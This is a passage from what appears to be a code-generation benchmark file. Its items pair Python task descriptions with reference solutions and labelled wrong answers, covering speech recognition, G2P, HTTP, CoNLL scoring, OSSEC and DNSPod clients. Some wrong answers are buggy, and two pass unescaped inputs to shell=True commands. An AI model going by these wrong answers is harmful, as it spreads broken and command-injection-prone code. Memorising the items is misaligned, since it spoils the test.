result with text and its timing information",
    "Canonical_solution": "import http.client\nimport json\nfrom typing import List\n\nclass AliRecognitionResult:\n    def __init__(self, text, begin_time, end_time):\n        self.text = text\n        self.begin_time = begin_time\n        self.end_time = end_time\n\nclass AliRecognitionService:\n    def __init__(self, access_key_id: str, access_key_secret: str, app_key: str):\n        self.ALI_ACCESS_AKID = access_key_id\n        self.ALI_ACCESS_AKKEY = access_key_secret\n        self.ALI_APP_KEY = app_key\n        self.token = getToken(self.ALI_ACCESS_AKID, self.ALI_ACCESS_AKKEY)\n        self.format = \"wav\"\n        self.sampleRate = 16000\n        self.url = 'https://nls-gateway-cn-shanghai.aliyuncs.com/stream/v1/FlashRecognizer'\n\n    def process(self, audioFile: str) -> List[AliRecognitionResult]:\n        result_list = []\n        request = self.url + '?appkey=' + self.ALI_APP_KEY\n        request = request + '&token=' + self.token\n        request = request + '&format=' + self.format\n        request = request + '&sample_rate=' + str(self.sampleRate)\n\n        with open(audioFile, mode='rb') as f:\n            audioContent = f.read()\n        \n        host = 'nls-gateway-cn-shanghai.aliyuncs.com'\n        httpHeaders = {'Content-Length': len(audioContent)}\n        \n        conn = http.client.HTTPSConnection(host)\n        conn.request(method='POST', url=request, body=audioContent, headers=httpHeaders)\n        response = conn.getresponse()\n        \n        body = response.read()\n        try:\n            body = json.loads(body)\n            status = body['status']\n            if status == 20000000:\n                result = body['flash_result']\n                if 'sentences' in result:\n                    for sentence in result['sentences']:\n                        result_list.append(\n                            AliRecognitionResult(sentence['text'], sentence['begin_time'], sentence['end_time']))\n        except ValueError:\n            print('The response is not json format string')\n        finally:\n            conn.close()\n        return result_list",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nfrom typing import List\nimport requests\nimport base64\nimport json\n\nclass AliRecognitionService:\n    ALI_ACCESS_AKID: str\n    ALI_ACCESS_AKKEY: str\n    ALI_APP_KEY: str\n    token: str\n    format: str\n    sampleRate: int\n    url: str\n\n    def __init__(self, access_key_id: str, access_key_secret: str, app_key: str) -> None:\n        self.ALI_ACCESS_AKID = access_key_id\n        self.ALI_ACCESS_AKKEY = access_key_secret\n        self.ALI_APP_KEY = app_key\n        self.token = self.get_token()\n        self.format = \"wav\"\n        self.sampleRate = 16000\n        self.url = \"https://nls-gateway.cn-shanghai.aliyuncs.com/stream/v1/aac\"\n\n    def get_token(self) -> str:\n        url = \"https://nls-gateway.cn-shanghai.aliyuncs.com/v20180430/token\"\n        headers = {\n            \"Content-Type\": \"application/json\"\n        }\n        data = {\n            \"AppKey\": self.ALI_APP_KEY,\n            \"AccessKeyId\": self.ALI_ACCESS_AKID,\n            \"SignatureMethod\": \"HMAC-SHA1\",\n            \"SignatureVersion\": \"1.0\",\n            \"Timestamp\": \"2021-01-01T00:00:00Z\",\n            \"Format\": \"JSON\",\n            \"SignatureNonce\": \"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\"\n        }\n        response = requests.post(url, headers=headers, data=json.dumps(data))\n        return response.json()[\"Token\"]\n\n    def process(self, audioFile: str) -> List[\"AliRecognitionResult\"]:\n        with open(audioFile, \"rb\") as f:\n            audio_data = base64.b64encode(f.read()).decode(\"utf-8\")\n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"Authorization\": self.token\n        }\n        data = {\n            \"format\": self.format,\n            \"sample_rate\": self.sampleRate,\n            \"audio\": audio_data\n        }\n        response = requests.post(self.url, headers=headers, data=json.dumps(data))\n        results = response.json()[\"Result\"][\"Sentences\"]\n        ali_recognition_results = []\n        for result in results:\n            ali_recognition_results.append(AliRecognitionResult(result[\"Text\"], result[\"BeginTime\"], result[\"EndTime\"]))\n        return ali_recognition_results\n\nclass AliRecognitionResult:\n    text: str\n    begin_time: int\n    end_time: int\n\n    def __init__(self, text: str, begin_time: int, end_time: int) -> None:\n        self.text = text\n        self.begin_time = begin_time\n        self.end_time = end_time\n```"
  },
  {
    "Task_id": 286,
    "Instruction": "Task Description: Implement a class that interfaces with the Phonetisaurus G2P (Grapheme-to-Phoneme) tool to convert words into their phonetic pronunciations using a pre-trained FST (Finite State Transducer) model. The class should handle both single words and lists of words, and provide options for retrieving multiple pronunciation candidates.\n\nClass Description: The PhonetisaurusG2P class provides an interface to the Phonetisaurus G2P tool, allowing for the conversion of words to their phonetic pronunciations using a specified FST model. It supports both single-word and batch processing, with optional n-best results.\n\nAttributes:\n- fst_model: [str] - The file path to the pre-trained FST model used for G2P conversion.\n- nbest: [int/None] - The number of best pronunciation candidates to return for each word (optional).\n- _logger: [logging.Logger] - Logger instance for debugging and error reporting.\n\nMethods:\n- __init__(fst_model=None, nbest=None) -> None - Initializes the G2P converter with the path to the FST model and optional n-best setting.\n- execute(fst_model, input, is_file=False, nbest=None) -> dict - Executes the phonetisaurus-g2p command with the given input and returns the pronunciation results as a dictionary.\n- _translate_word(word) -> dict - Internal method to translate a single word to phonemes.\n- _translate_words(words) -> dict - Internal method to translate a list of words to phonemes using a temporary file.\n- translate(words) -> dict - Main interface method that translates either a single word or a list of words to their phonetic pronunciations.",
    "Canonical_solution": "import os\nimport re\nimport subprocess\nimport tempfile\nimport logging\nimport yaml\n\nclass PhonetisaurusG2P:\n    PATTERN = re.compile(r'^(?P<word>.+)\\t(?P<precision>\\d+\\.\\d+)\\t<s> ' +\n                         r'(?P<pronounciation>.*) </s>', re.MULTILINE)\n\n    def __init__(self, fst_model=None, nbest=None):\n        self._logger = logging.getLogger(__name__)\n        self.fst_model = os.path.abspath(fst_model)\n        self._logger.debug(\"Using FST model: '%s'\", self.fst_model)\n        self.nbest = nbest\n        if self.nbest is not None:\n            self._logger.debug(\"Will use the %d best results.\", self.nbest)\n\n    def execute(self, fst_model, input, is_file=False, nbest=None):\n        cmd = ['phonetisaurus-g2p',\n               '--model=%s' % fst_model,\n               '--input=%s' % input,\n               '--words']\n\n        if is_file:\n            cmd.append('--isfile')\n\n        if nbest is not None:\n            cmd.extend(['--nbest=%d' % nbest])\n\n        cmd = [str(x) for x in cmd]\n        try:\n            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,\n                                    stderr=subprocess.PIPE)\n            stdoutdata, stderrdata = proc.communicate()\n        except OSError:\n            self._logger.error(\"Error occured while executing command '%s'\",\n                             ' '.join(cmd), exc_info=True)\n            raise\n\n        if stderrdata:\n            for line in stderrdata.splitlines():\n                message = line.strip()\n                if message:\n                    self._logger.debug(message)\n\n        if proc.returncode != 0:\n            self._logger.error(\"Command '%s' return with exit status %d\",\n                             ' '.join(cmd), proc.returncode)\n            raise OSError(\"Command execution failed\")\n\n        result = {}\n        if stdoutdata is not None:\n            for word, precision, pronounc in self.PATTERN.findall(stdoutdata):\n                if word not in result:\n                    result[word] = []\n                result[word].append(pronounc)\n        return result\n\n    def _translate_word(self, word):\n        return self.execute(self.fst_model, word, nbest=self.nbest)\n\n    def _translate_words(self, words):\n        with tempfile.NamedTemporaryFile(suffix='.g2p', delete=False) as f:\n            for word in words:\n                f.write(\"%s\\n\" % word)\n            tmp_fname = f.name\n        output = self.execute(self.fst_model, tmp_fname, is_file=True,\n                              nbest=self.nbest)\n        os.remove(tmp_fname)\n        return output\n\n    def translate(self, words):\n        if type(words) is str or len(words) == 1:\n            self._logger.debug('Converting single word to phonemes')\n            output = self._translate_word(words if type(words) is str\n                                          else words[0])\n        else:\n            self._logger.debug('Converting %d words to phonemes', len(words))\n            output = self._translate_words(words)\n        self._logger.debug('G2P conversion returned phonemes for %d words',\n                           len(output))\n        return output",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport tempfile\nimport logging\nimport json\n\nclass PhonetisaurusG2P:\n    def __init__(self, fst_model=None, nbest=None):\n        self.fst_model = fst_model\n        self.nbest = nbest\n        self._logger = logging.getLogger(__name__)\n\n    def execute(self, fst_model, input, is_file=False, nbest=None):\n        if is_file:\n            input = f'< {input}'\n        cmd = f'phonetisaurus-g2p -model {fst_model} {input}'\n        if nbest:\n            cmd += f' -nbest {nbest}'\n        try:\n            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)\n            return json.loads(output.decode('utf-8'))\n        except subprocess.CalledProcessError as e:\n            self._logger.error(f'Error executing phonetisaurus-g2p: {e.output.decode(\"utf-8\")}')\n            return {}\n\n    def _translate_word(self, word):\n        return self.execute(self.fst_model, word, is_file=False, nbest=self.nbest)\n\n    def _translate_words(self, words):\n        with tempfile.NamedTemporaryFile(delete=False) as f:\n            for word in words:\n                f.write(f'{word}\\n'.encode('utf-8'))\n            f.close()\n            return self.execute(self.fst_model, f.name, is_file=True, nbest=self.nbest)\n\n    def translate(self, words):\n        if isinstance(words, str):\n            return self._translate_word(words)\n        elif isinstance(words, list):\n            return self._translate_words(words)\n        else:\n            self._logger.error('Invalid input type. Expected str or list.')\n            return {}\n```\n"
  },
  {
    "Task_id": 29,
    "Instruction": "Task Description: Implement a robust HTTP client class in Python that handles both HTTP and HTTPS connections, supports proxy configuration, and manages connection timeouts and keep-alive settings.\n\nClass Description: The MNSHttp class provides a wrapper around Python's http.client module to handle HTTP/HTTPS requests with additional features like proxy support, connection timeout management, and keep-alive functionality.\n\nAttributes:\n- host: str - The target server hostname or IP address\n- is_https: bool - Flag indicating whether to use HTTPS (True) or HTTP (False)\n- connection_timeout: int - Connection timeout in seconds (default: 60)\n- keep_alive: bool - Flag for maintaining persistent connections (default: True)\n- request_size: int - Tracks the size of the last request sent\n- response_size: int - Tracks the size of the last response received\n- logger: Logger - Optional logger for debugging information\n- proxy: str - Optional proxy server configuration\n- conn: HTTPConnection/HTTPSConnection - The active connection object\n\nMethods:\n- __init__(host, connection_timeout=60, keep_alive=True, logger=None, is_https=False) -> None - Initializes the HTTP client with connection parameters\n- _new_conn() -> HTTPConnection/HTTPSConnection - Creates a new connection object based on current configuration\n- _basic_auth_str(username, password) -> str - Generates Basic Auth header string\n- get_env_proxy() -> str - Retrieves proxy configuration from environment variables\n- set_connection_timeout(connection_timeout) -> None - Updates the connection timeout and recreates the connection if needed\n- send_request(req_inter) -> ResponseInternal - Sends an HTTP request and returns the response, handling proxy configuration and connection management\n\nHelper Classes:\n- MNSHTTPConnection(host, port=None, strict=None, connection_timeout=60) - Custom HTTP connection with timeout support and request size tracking\n- MNSHTTPSConnection(host, port=None) - Custom HTTPS connection with request size tracking\n\nBoth connection classes extend their respective http.client counterparts and add:\n- request_length tracking\n- Custom connect() implementation for MNSHTTPConnection with timeout support\n- Overridden send() method to track request size\n- Standardized request() method initialization",
    "Canonical_solution": "import base64\nimport socket\nfrom http.client import HTTPConnection, BadStatusLine, HTTPSConnection\nfrom urllib.parse import urlparse, unquote\nimport os\n\nclass MNSHttp:\n    def __init__(self, host, connection_timeout=60, keep_alive=True, logger=None, is_https=False):\n        self.host = host\n        self.is_https = is_https\n        self.connection_timeout = connection_timeout\n        self.keep_alive = keep_alive\n        self.request_size = 0\n        self.response_size = 0\n        self.logger = logger\n        self.proxy = None\n        self.conn = self._new_conn()\n        if self.logger:\n            self.logger.info(\"InitMNSHttp KeepAlive:%s ConnectionTime:%s\" % (self.keep_alive, self.connection_timeout))\n\n    def _new_conn(self):\n        if self.is_https:\n            return MNSHTTPSConnection(self.host)\n        else:\n            return MNSHTTPConnection(self.host, connection_timeout=self.connection_timeout)\n\n    def _basic_auth_str(self, username, password):\n        if isinstance(username, str):\n            username = username.encode()\n        if isinstance(password, str):\n            password = password.encode()\n        return 'Basic ' + base64.b64encode(b':'.join((username, password))).strip().decode()\n\n    def get_env_proxy(self):\n        if self.is_https:\n            return os.getenv('https_proxy') or os.getenv('HTTPS_PROXY')\n        else:\n            return os.getenv('http_proxy') or os.getenv('HTTP_PROXY')\n\n    def set_connection_timeout(self, connection_timeout):\n        self.connection_timeout = connection_timeout\n        if not self.is_https:\n            if self.conn:\n                self.conn.close()\n            self.conn = MNSHTTPConnection(self.host, connection_timeout=connection_timeout)\n\n    def send_request(self, req_inter):\n        try:\n            if self.logger:\n                self.logger.debug(\"SendRequest %s\" % req_inter)\n\n            proxy = self.get_env_proxy()\n            if proxy:\n                url = urlparse(proxy)\n                self.conn.close()\n                if url.username:\n                    req_inter.header['Proxy-Authorization'] = self._basic_auth_str(unquote(url.username), unquote(url.password))\n                if self.is_https:\n                    self.conn = MNSHTTPSConnection(url.hostname, url.port)\n                else:\n                    self.conn = MNSHTTPConnection(url.hostname, url.port, connection_timeout=self.connection_timeout)\n                self.conn.set_tunnel(self.host, headers=req_inter.header)\n            else:\n                if self.conn.host != self.host:\n                    self.conn.close()\n                    self.conn = self._new_conn()\n\n            self.conn.request(req_inter.method, 'http://%s%s' % (self.host, req_inter.uri), req_inter.data, req_inter.header)\n            self.conn.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n            try:\n                http_resp = self.conn.getresponse()\n            except BadStatusLine:\n                self.conn.close()\n                self.conn.request(req_inter.method, req_inter.uri, req_inter.data, req_inter.header)\n                self.conn.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n                http_resp = self.conn.getresponse()\n            \n            headers = dict(http_resp.getheaders())\n            resp_inter = ResponseInternal(status=http_resp.status, header=headers, data=http_resp.read())\n            self.request_size = self.conn.request_length\n            self.response_size = len(resp_inter.data)\n            \n            if not self.is_keep_alive():\n                self.conn.close()\n            if self.logger:\n                self.logger.debug(\"GetResponse %s\" % resp_inter)\n            return resp_inter\n        except Exception as e:\n            self.conn.close()\n            raise MNSClientNetworkException(\"NetWorkException\", str(e), req_inter.get_req_id())\n\nclass MNSHTTPConnection(HTTPConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        HTTPConnection.__init__(self, host, port, strict)\n        self.request_length = 0\n        self.connection_timeout = connection_timeout\n\n    def send(self, str):\n        HTTPConnection.send(self, str)\n        self.request_length += len(str)\n\n    def request(self, method, url, body=None, headers={}):\n        self.request_length = 0\n        HTTPConnection.request(self, method, url, body, headers)\n\n    def connect(self):\n        msg = \"getaddrinfo returns an empty list\"\n        for res in socket.getaddrinfo(self.host, self.port, 0, socket.SOCK_STREAM):\n            af, socktype, proto, canonname, sa = res\n            try:\n                self.sock = socket.socket(af, socktype, proto)\n                self.sock.settimeout(self.connection_timeout)\n                self.sock.connect(sa)\n            except socket.error as msg:\n                if self.sock:\n                    self.sock.close()\n                self.sock = None\n                continue\n            break\n        if not self.sock:\n            raise socket.error(msg)\n\nclass MNSHTTPSConnection(HTTPSConnection):\n    def __init__(self, host, port=None):\n        HTTPSConnection.__init__(self, host, port)\n        self.request_length = 0\n\n    def send(self, str):\n        HTTPSConnection.send(self, str)\n        self.request_length += len(str)\n\n    def request(self, method, url, body=None, headers={}):\n        self.request_length = 0\n        HTTPSConnection.request(self, method, url, body, headers)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport http.client\nimport ssl\nimport urllib.parse\nimport logging\nimport os\n\nclass MNSHttp:\n    def __init__(self, host, connection_timeout=60, keep_alive=True, logger=None, is_https=False):\n        self.host = host\n        self.is_https = is_https\n        self.connection_timeout = connection_timeout\n        self.keep_alive = keep_alive\n        self.request_size = 0\n        self.response_size = 0\n        self.logger = logger or logging.getLogger(__name__)\n        self.proxy = self.get_env_proxy()\n        self.conn = self._new_conn()\n\n    def _new_conn(self):\n        if self.is_https:\n            return MNSHTTPSConnection(self.host)\n        else:\n            return MNSHTTPConnection(self.host, connection_timeout=self.connection_timeout)\n\n    def _basic_auth_str(self, username, password):\n        import base64\n        return \"Basic \" + base64.b64encode((username + \":\" + password).encode('utf-8')).decode('utf-8')\n\n    def get_env_proxy(self):\n        proxy = os.environ.get('https_proxy') or os.environ.get('http_proxy')\n        if proxy:\n            proxy = urllib.parse.urlparse(proxy)\n            return proxy.hostname, proxy.port\n        return None\n\n    def set_connection_timeout(self, connection_timeout):\n        self.connection_timeout = connection_timeout\n        self.conn.close()\n        self.conn = self._new_conn()\n\n    def send_request(self, req_inter):\n        if self.proxy:\n            self.conn.set_tunnel(req_inter.url.hostname, req_inter.url.port)\n        self.conn.request(req_inter.method, req_inter.url.path, body=req_inter.body, headers=req_inter.headers)\n        resp = self.conn.getresponse()\n        self.response_size = len(resp.read())\n        resp = ResponseInternal(resp.status, resp.reason, resp.getheaders(), self.response_size)\n        resp.read()\n        return resp\n\n\nclass MNSHTTPConnection(http.client.HTTPConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        super().__init__(host, port, strict)\n        self.timeout = connection_timeout\n        self.request_length = 0\n\n    def connect(self):\n        self.sock = self._create_connection(\n            (self.host, self.port),\n            self.timeout,\n            self.source_address,\n            socket_options=self.socket_options,\n        )\n\n    def send(self, data):\n        self.request_length = len(data)\n        super().send(data)\n\n\nclass MNSHTTPSConnection(http.client.HTTPSConnection):\n    def __init__(self, host, port=None):\n        super().__init__(host, port)\n        self.request_length = 0\n\n    def connect(self):\n        sock = self._create_connection(\n            (self.host, self.port),\n            self.timeout,\n            self.source_address,\n            socket_options=self.socket_options,\n        )\n        if self._tunnel_host:\n            self._tunnel()\n        self.sock = ssl.wrap_socket(sock, self.key_file, self.cert_file, ssl_version=self.ssl_version)\n\n\nclass ResponseInternal:\n    def __init__(self, status, reason, headers, size):\n        self.status = status\n        self.reason = reason\n        self.headers = headers\n        self.size = size\n\n    def read(self):\n        return b''\n```\n"
  },
  {
    "Task_id": 291,
    "Instruction": "Task Description: Implement a function that evaluates coreference resolution results using the official CoNLL-2012 evaluation script, parsing and returning the recall, precision, and F1 scores.\n\nFunction Description: The function `official_conll_eval` executes the official CoNLL-2012 evaluation script as a subprocess, captures its output, and parses the recall, precision, and F1 scores from the output. It can optionally log the official output for debugging or reporting purposes.\n\nInput:\n- `gold_path` (str): Path to the file containing gold-standard coreference annotations.\n- `predicted_path` (str): Path to the file containing predicted coreference annotations.\n- `metric` (str): The evaluation metric to compute (e.g., \"muc\", \"bcub\", \"ceafe\").\n- `official_stdout` (bool, optional): If True, logs the official evaluation script output. Defaults to True.\n\nOutput:\n- Returns a dictionary with the following keys:\n  - \"r\" (float): Recall score in percentage.\n  - \"p\" (float): Precision score in percentage.\n  - \"f\" (float): F1 score in percentage.",
    "Canonical_solution": "import re\nimport subprocess\nimport logging\n\nlogger = logging.getLogger(__name__)\nCOREF_RESULTS_REGEX = re.compile(r\".*Coreference: Recall: \\([0-9.]+ / [0-9.]+\\) ([0-9.]+)%\\tPrecision: \\([0-9.]+ / [0-9.]+\\) ([0-9.]+)%\\tF1: ([0-9.]+)%.*\", re.DOTALL)\n\ndef official_conll_eval(gold_path, predicted_path, metric, official_stdout=True):\n    cmd = [\"conll-2012/scorer/v8.01/scorer.pl\", metric, gold_path, predicted_path, \"none\"]\n    process = subprocess.Popen(cmd, stdout=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    process.wait()\n\n    stdout = stdout.decode(\"utf-8\")\n    if stderr is not None:\n        logger.error(stderr)\n\n    if official_stdout:\n        logger.info(\"Official result for {}\".format(metric))\n        logger.info(stdout)\n\n    coref_results_match = re.match(COREF_RESULTS_REGEX, stdout)\n    recall = float(coref_results_match.group(1))\n    precision = float(coref_results_match.group(2))\n    f1 = float(coref_results_match.group(3))\n    return {\"r\": recall, \"p\": precision, \"f\": f1}",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport re\n\ndef official_conll_eval(gold_path, predicted_path, metric, official_stdout=True):\n    cmd = f\"perl eval.pl -g {gold_path} -s {predicted_path} -o {metric}\"\n    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n    if official_stdout:\n        print(result.stdout)\n    output = result.stdout\n    r = float(re.search(r\"Recall: ([\\d.]+)\", output).group(1))\n    p = float(re.search(r\"Precision: ([\\d.]+)\", output).group(1))\n    f = float(re.search(r\"F1: ([\\d.]+)\", output).group(1))\n    return {\"r\": r, \"p\": p, \"f\": f}\n```"
  },
  {
    "Task_id": 298,
    "Instruction": "Task Description: Implement a class to collect and analyze OSSEC (Open Source Host-based Intrusion Detection System) agent states using subprocess communication.\n\nClass Description: The OssecCollector class interacts with the OSSEC agent control utility to retrieve agent status information and parse the results into a structured format. It handles command execution with optional sudo privileges and processes the output to count agent states.\n\nAttributes:\n- bin_path: [str] - Path to the OSSEC agent_control binary (default: '/var/ossec/bin/agent_control')\n- use_sudo: [bool] - Flag indicating whether to use sudo for command execution (default: True)\n- sudo_cmd: [str] - Path to the sudo binary (default: '/usr/bin/sudo')\n\nMethods:\n- __init__(bin_path: str = '/var/ossec/bin/agent_control', use_sudo: bool = True, sudo_cmd: str = '/usr/bin/sudo') -> None - Initializes the collector with configuration paths\n- collect() -> dict - Executes the agent control command, processes the output, and returns a dictionary counting agent states by status\n\nThe implementation should use subprocess.PIPE for inter-process communication and handle potential execution errors appropriately.",
    "Canonical_solution": "import subprocess\nimport re\nfrom diamond.collector import str_to_bool\n\nclass OssecCollector:\n    def __init__(self, bin_path='/var/ossec/bin/agent_control', use_sudo=True, sudo_cmd='/usr/bin/sudo'):\n        self.bin_path = bin_path\n        self.use_sudo = use_sudo\n        self.sudo_cmd = sudo_cmd\n\n    def collect(self):\n        command = [self.bin_path, '-l']\n\n        if str_to_bool(self.use_sudo):\n            command.insert(0, self.sudo_cmd)\n\n        try:\n            p = subprocess.Popen(command, stdout=subprocess.PIPE)\n            res = p.communicate()[0]\n        except Exception as e:\n            raise Exception('Unable to exec cmd: %s, because %s' % (' '.join(command), str(e)))\n\n        if res == '':\n            raise Exception('Empty result from exec cmd: %s' % (' '.join(command)))\n\n        states = {}\n        for line in res.split(\"\\n\"):\n            if not line.startswith('   ID: '):\n                continue\n            fragments = line.split(',')\n            state = fragments[-1].lstrip()\n            if state not in states:\n                states[state] = 1\n            else:\n                states[state] += 1\n\n        return states",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\nclass OssecCollector:\n    def __init__(self, bin_path: str = '/var/ossec/bin/agent_control', use_sudo: bool = True, sudo_cmd: str = '/usr/bin/sudo') -> None:\n        self.bin_path = bin_path\n        self.use_sudo = use_sudo\n        self.sudo_cmd = sudo_cmd\n\n    def collect(self) -> dict:\n        cmd = [self.bin_path, '-l', 'all']\n        if self.use_sudo:\n            cmd = [self.sudo_cmd] + cmd\n\n        try:\n            output = subprocess.check_output(cmd, universal_newlines=True)\n        except subprocess.CalledProcessError as e:\n            print(f\"Error executing command: {e}\")\n            return {}\n\n        agent_states = {}\n        for line in output.splitlines():\n            if line.startswith('Status'):\n                status, count = line.split(':')\n                agent_states[status.strip()] = int(count.strip())\n\n        return agent_states\n```"
  },
  {
    "Task_id": 30,
    "Instruction": "Task Description: Implement a Python class to interact with the DNSPod API for managing DNS records, including querying domain information, listing records, and updating DNS records.\n\nClass Description: DNSPodAPI is a class that provides methods to interact with DNSPod's API for DNS management. It handles authentication, request construction, and response processing for various DNS operations.\n\nAttributes:\n\nSITE: str - The DNSPod API endpoint (dnsapi.cn)\nMETHOD: str - Default HTTP method for requests (POST)\nTOKEN_PARAM: str - Parameter name for authentication token (login_token)\nDEFAULT: str - Default value for record line (\"\u9ed8\u8ba4\")\nLENGTH: str - Parameter name for response length (\"length\")\nID: str - DNSPod API token ID\nTOKEN: str - DNSPod API token key\nPROXY: str - Optional proxy server address\nTTL: int - Time-to-live value for DNS records\ndomain_list: dict - Cache of domain names and their IDs\nrecords: dict - Cache of DNS records organized by domain ID\nrecord_keys: tuple - Valid fields for DNS records\n\nMethods:\n\n__init__(token_id=None, token_key=None, proxy=None, ttl=None) -> None - Initializes the DNSPodAPI instance with authentication tokens and optional proxy/ttl settings.\n\nrequest(action, param=None, **params) -> dict - Makes an authenticated API request to the specified action with given parameters. Returns parsed JSON response or raises an exception on error.\n\nget_domain_info(domain) -> tuple - Splits a domain into its main and subdomain parts, returning the domain ID and subdomain.\n\nget_domain_id(domain) -> str - Retrieves and caches the ID for a given domain name.\n\nget_records(did, **conditions) -> dict - Retrieves DNS records for a domain ID that match given conditions (e.g., name, type).\n\nupdate_record(domain, value, record_type=\"A\") -> dict - Updates or creates a DNS record for the given domain with the specified value and record type.",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom json import loads as jsondecode\nfrom os import environ\n\nclass DNSPodAPI:\n    def __init__(self, token_id=None, token_key=None, proxy=None, ttl=None):\n        self.SITE = \"dnsapi.cn\"\n        self.METHOD = \"POST\"\n        self.TOKEN_PARAM = \"login_token\"\n        self.DEFAULT = \"\u9ed8\u8ba4\"\n        self.LENGTH = \"length\"\n        \n        self.ID = token_id\n        self.TOKEN = token_key\n        self.PROXY = proxy\n        self.TTL = ttl\n        self.domain_list = {}\n        self.records = {}\n        self.record_keys = (\"id\", \"name\", \"type\", \"line\", \"line_id\", \"enabled\", \"mx\", \"value\")\n\n    def request(self, action, param=None, **params):\n        if param:\n            params.update(param)\n        params = {k: v for k, v in params.items() if v is not None}\n        params.update({self.TOKEN_PARAM: \"%s,%s\" % (self.ID, self.TOKEN), 'format': 'json', self.LENGTH: \"3000\"})\n        \n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        conn.request(self.METHOD, '/' + action, urlencode(params), {\n            \"Content-type\": \"application/x-www-form-urlencoded\",\n            \"User-Agent\": \"DDNS/%s (ddns@newfuture.cc)\" % environ.get(\"DDNS_VERSION\", \"1.0.0\")\n        })\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            raise Exception(res)\n        else:\n            data = jsondecode(res)\n            if not data:\n                raise Exception(\"empty response\")\n            elif data.get(\"status\", {}).get(\"code\") == \"1\":\n                return data\n            else:\n                raise Exception(data.get('status', {}))\n\n    def get_domain_info(self, domain):\n        domain_split = domain.split('.')\n        sub, did = None, None\n        main = domain_split.pop()\n        while domain_split:\n            main = domain_split.pop() + '.' + main\n            did = self.get_domain_id(main)\n            if did:\n                sub = \".\".join(domain_split) or '@'\n                break\n        return did, sub\n\n    def get_domain_id(self, domain):\n        if domain in self.domain_list:\n            return self.domain_list[domain]\n        else:\n            try:\n                info = self.request('Domain.Info', domain=domain)\n                did = info.get(\"domain\", {}).get(\"id\")\n                if did:\n                    self.domain_list[domain] = did\n                    return did\n            except Exception:\n                return None\n\n    def get_records(self, did, **conditions):\n        if did not in self.records:\n            self.records[did] = {}\n            data = self.request('Record.List', domain_id=did)\n            if data:\n                for record in data.get('records'):\n                    self.records[did][record[\"id\"]] = {\n                        k: v for (k, v) in record.items() if k in self.record_keys}\n\n        records = {}\n        for (rid, record) in self.records[did].items():\n            for (k, value) in conditions.items():\n                if record.get(k) != value:\n                    break\n            else:\n                records[rid] = record\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        domainid, sub = self.get_domain_info(domain)\n        if not domainid:\n            raise Exception(\"invalid domain: [ %s ] \" % domain)\n\n        records = self.get_records(domainid, name=sub, type=record_type)\n        result = {}\n        if records:\n            for (did, record) in records.items():\n                if record[\"value\"] != value:\n                    res = self.request('Record.Modify', \n                                     record_id=did, \n                                     record_line=record[\"line\"].replace(\"Default\", \"default\").encode(\"utf-8\"), \n                                     value=value, \n                                     sub_domain=sub, \n                                     domain_id=domainid, \n                                     record_type=record_type, \n                                     ttl=self.TTL)\n                    if res:\n                        self.records[domainid][did][\"value\"] = value\n                        result[did] = res.get(\"record\")\n                    else:\n                        result[did] = \"update fail!\\n\" + str(res)\n                else:\n                    result[did] = domain\n        else:\n            res = self.request(\"Record.Create\", \n                             domain_id=domainid, \n                             value=value,\n                             sub_domain=sub, \n                             record_type=record_type, \n                             record_line=self.DEFAULT, \n                             ttl=self.TTL)\n            if res:\n                did = res.get(\"record\")[\"id\"]\n                self.records[domainid][did] = res.get(\"record\")\n                self.records[domainid][did].update(\n                    value=value, sub_domain=sub, record_type=record_type)\n                result = res.get(\"record\")\n            else:\n                result = domain + \" created fail!\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nclass DNSPodAPI:\n    SITE = \"dnsapi.cn\"\n    METHOD = \"POST\"\n    TOKEN_PARAM = \"login_token\"\n    DEFAULT = \"\u9ed8\u8ba4\"\n    LENGTH = \"length\"\n    ID = \"123456\"\n    TOKEN = \"abcdefg\"\n    PROXY = None\n    TTL = 600\n    domain_list = {}\n    records = {}\n    record_keys = (\"name\", \"type\", \"line\", \"value\", \"ttl\", \"enabled\", \"monitor_status\", \"remark\")\n\n    def __init__(self, token_id=None, token_key=None, proxy=None, ttl=None):\n        self.ID = token_id or self.ID\n        self.TOKEN = token_key or self.TOKEN\n        self.PROXY = proxy\n        self.TTL = ttl or self.TTL\n\n    def request(self, action, param=None, **params):\n        params[self.TOKEN_PARAM] = f\"{self.ID},{self.TOKEN}\"\n        if param:\n            params[self.LENGTH] = param\n        response = requests.post(f\"https://{self.SITE}/{action}\", params, proxies={\"http\": self.PROXY, \"https\": self.PROXY})\n        if response.status_code != 200:\n            raise Exception(f\"API request failed with status code {response.status_code}\")\n        return response.json()\n\n    def get_domain_info(self, domain):\n        parts = domain.split(\".\", 1)\n        if len(parts) == 1:\n            return domain, \"\"\n        return parts[1], parts[0]\n\n    def get_domain_id(self, domain):\n        if domain not in self.domain_list:\n            domain_id = self.request(\"Domain.Info\", domain).get(\"id\")\n            self.domain_list[domain] = domain_id\n        return self.domain_list[domain]\n\n    def get_records(self, did, **conditions):\n        if did not in self.records:\n            self.records[did] = self.request(\"Record.List\", did)\n        records = self.records[did]\n        for key in list(conditions.keys()):\n            if key not in self.record_keys:\n                del conditions[key]\n        if 